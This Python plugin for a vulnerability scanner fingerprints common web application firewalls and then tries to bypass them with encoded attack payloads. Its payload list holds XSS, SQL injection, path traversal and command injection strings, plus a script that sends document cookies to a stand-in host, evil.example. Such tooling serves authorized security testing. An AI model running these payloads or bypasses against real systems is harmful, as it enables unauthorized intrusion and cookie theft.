"""
Advanced WAF Detection and Bypass Plugin
"""
import asyncio
import re
from urllib.parse import quote

from scanner.plugins.base import BasePlugin
from scanner.logger import get_logger

LOG = get_logger("vuln-scanner")

class WAFBypass(BasePlugin):
    name = "waf_bypass"
    description = "Detects and attempts to bypass Web Application Firewalls (WAFs)"

    WAF_SIGNATURES = {
        "Cloudflare": {
            "headers": {"Server": "cloudflare"},
            "body": "cloudflare",
            "block_status": 403,
        },
        "Akamai": {
            "headers": {"Server": "AkamaiGHost"},
            "body": "akamai",
            "block_status": 403,
        },
        "AWS WAF": {
            "headers": {"Server": "awselb/2.0"},
            "body": "aws",
            "block_status": 403,
        },
        "Imperva": {
            "headers": {"X-Iinfo": ".*"},
            "body": "imperva",
            "block_status": 403,
        },
    }

    MALICIOUS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "localhost:3000",
        "evil.example",
        "'; DROP TABLE users; --",
        "../etc/passwd",
        "|| ls ||",
        "| cat /etc/passwd ||",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "%27%3B%20DROP%20TABLE%20users%3B%20--",
        "%2E%2E%2Fetc%2Fpasswd",
        "%7C%20cat%20%2Fetc%2Fpasswd%20%7C%7C",
        "%7C%7C%20ls%20%7C",
        "%3Cimg%20src=x%20onerror=alert(1)%3E",
        "%3Csvg%20onload=alert(1)%3E",
        "%3Ciframe%20src=javascript:alert(1)%3E",
        "%3Cbody%20onload=alert(1)%3E",
        "%3Cscript%3Efetch('http://evil.example/steal?cookie='%2Bdocument.cookie)%3C/script%3E",
    ]

    async def run(self, target: str, requester, oast_server: str = None):
        if not target.startswith("http"):
            return []

        findings = []
        waf_detected = None

        # 1. Initial benign request
        try:
            benign_response = await requester.get(target)
            if not benign_response or not isinstance(benign_response, dict):
                return []

            # Skip testing if target returns 404 or other error pages
            if self.is_error_page(benign_response):
                LOG.debug(f"WAF Bypass: Skipping {target} - error page detected (status: {benign_response.get('status')})")
                return []

            # Only test valid targets (2xx responses)
            if not self.is_valid_target(benign_response):
                LOG.debug(f"WAF Bypass: Skipping {target} - invalid target (status: {benign_response.get('status')})")
                return []

        except Exception as e:
            LOG.error(f"WAF Bypass: Initial request failed: {e}")
            return []

        # 2. Malicious request to trigger WAF
        for payload in self.MALICIOUS_PAYLOADS:
            try:
                malicious_params = {"param": payload}
                malicious_response = await requester.get(target, params=malicious_params)
                if not malicious_response or not isinstance(malicious_response, dict):
                    continue
            except Exception as e:
                LOG.error(f"WAF Bypass: Malicious request failed: {e}")
                continue

            # 3. Detect WAF
            for waf_name, signature in self.WAF_SIGNATURES.items():
                # Check headers
                for header, value in signature["headers"].items():
                    if header in malicious_response.get("headers", {}) and re.search(value, malicious_response["headers"][header]):
                        waf_detected = waf_name
                        break
                if waf_detected:
                    break

                # Check body
                if signature["body"] in malicious_response.get("text", "").lower():
                    waf_detected = waf_name
                    break
            
            if waf_detected:
                break
        
        if waf_detected:
            findings.append({
                "type": "waf_detected",
                "message": f"WAF detected: {waf_detected}",
                "severity": "info",
                "confidence": "firm",
            })

            # 4. Attempt bypasses
            for payload in self.MALICIOUS_PAYLOADS:
                bypass_payloads = {
                    "url_encoded": quote(payload),
                    "double_url_encoded": quote(quote(payload)),
                    "html_encoded": payload.replace("<", "&lt;").replace(">", "&gt;"),
                    "case_variation": payload.upper(),
                    "null_byte": f"{payload}%00",
                }

                for bypass_name, bypass_payload in bypass_payloads.items():
                    try:
                        bypass_params = {"param": bypass_payload}
                        bypass_response = await requester.get(target, params=bypass_params)
                        if not bypass_response or not isinstance(bypass_response, dict):
                            continue

                        # If we don't get the block status, we might have bypassed the WAF
                        if bypass_response.get("status") != self.WAF_SIGNATURES[waf_detected]["block_status"]:
                            findings.append({
                                "type": "waf_bypass_successful",
                                "message": f"WAF ({waf_detected}) bypassed with technique: {bypass_name}",
                                "payload": bypass_payload,
                                "severity": "high",
                                "confidence": "firm",
                            })
                    except Exception as e:
                        LOG.error(f"WAF Bypass: Bypass attempt '{bypass_name}' failed: {e}")

        return findings


# Plugin registration
Plugin = WAFBypass
